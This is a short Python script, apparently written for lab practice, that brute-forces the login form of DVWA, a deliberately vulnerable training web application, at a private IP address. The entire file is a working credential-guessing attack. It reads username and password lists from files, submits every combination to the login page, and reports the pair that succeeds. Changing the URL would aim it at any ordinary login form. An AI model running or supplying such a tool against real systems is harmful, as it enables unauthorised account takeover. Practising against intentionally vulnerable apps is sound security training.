import requests

# URL to attack
url = "http://192.168.240.120/dvwa/login.php"

# Get users
user_file = input("Enter the path to the file containing usernames: ")
with open(user_file, "r") as fd:
    users = fd.readlines()

# Get passwords
password_file = input("Enter the path to the file containing passwords: ")
with open(password_file, "r") as fd:
    passwords = fd.readlines()

# Changes to True when user/pass found
done = False

print("Attacking " + url + "\n")

for user in users:
    user = user.rstrip()
    for password in passwords:
        if not done:
            password = password.rstrip()
            payload = {
                "username": user,
                "password": password,
                "Login": "Login"
            }

            response = requests.post(url, data=payload)

            # Check if login is successful
            if response.url.endswith("index.php"):
                print("Success!\nUser: " + user + "\nPassword: " + password)
                done = True
                break
            else:
                print("Failed: " + user + " - " + password)
